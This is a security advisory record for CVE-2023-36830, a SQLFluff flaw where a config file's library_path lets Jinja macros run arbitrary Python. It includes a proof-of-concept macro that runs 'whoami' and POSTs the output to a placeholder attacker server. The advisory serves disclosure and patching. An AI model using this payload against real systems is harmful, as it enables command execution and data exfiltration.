---
identifier: "CVE-2023-36830"
identifiers:
- "CVE-2023-36830"
- "GHSA-jqhc-m2j3-fjrx"
package_slug: "pypi/sqlfluff"
title: "SQLFluff users with access to config file, using `libary_path` may call arbitrary
  python code"
description: "In environments where untrusted users have access to the config files
  (e.g. `.sqlfluff`), there is a potential security vulnerability where those users
  could use the `library_path` config value to allow arbitrary python code to be executed
  via macros. Jinja macros are executed within a [sandboxed environment](https://docs.snowflake.com/en/sql-reference/sql/show-warehouses)
  but the following example shows how an external url might be called and used to
  reveal internal information to an external listener:\n\n```ini\n[sqlfluff:templater:jinja]\nlibrary_path
  = /usr/lib/python3.9/http\n\n[sqlfluff:templater:jinja:macros]\na_macro_def = {{client.HTTPSConnection('<SOME_EXTERNAL_SERVER_YOU_CONTROL>').request('POST',
  '/', server.os.popen('whoami').read())}}\n```\n\nFor many users who use SQLFluff
  in the context of an environment where all users _already have fairly escalated
  privileges_, this may not be an issue - however in larger user bases, or where SQLFluff
  is bundled into another tool where developers still wish to give users access to
  supply their on _rule configuration_, this may be an issue."
date: "2024-10-28"
pubdate: "2023-07-06"
affected_range: "<2.1.2"
fixed_versions:
- "2.1.2"
affected_versions: "All versions before 2.1.2"
not_impacted: "All versions starting from 2.1.2"
solution: "Upgrade to version 2.1.2 or above."
urls:
- "https://nvd.nist.gov/vuln/detail/CVE-2023-36830"
- "https://github.com/advisories/GHSA-jqhc-m2j3-fjrx"
- "https://github.com/sqlfluff/sqlfluff/security/advisories/GHSA-jqhc-m2j3-fjrx"
- "https://github.com/sqlfluff/sqlfluff/commit/6cdc38d76bedab4801b035c04d3c2b3aea17de86"
- "https://github.com/pypa/advisory-database/tree/main/vulns/sqlfluff/PYSEC-2023-111.yaml"
- "https://github.com/sqlfluff/sqlfluff"
- "https://github.com/sqlfluff/sqlfluff/releases/tag/2.1.2"
cvss_v3: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
uuid: "c1d20026-b40f-488a-bf1d-f50a6830bb23"
cwe_ids:
- "CWE-74"
- "CWE-937"
- "CWE-1035"
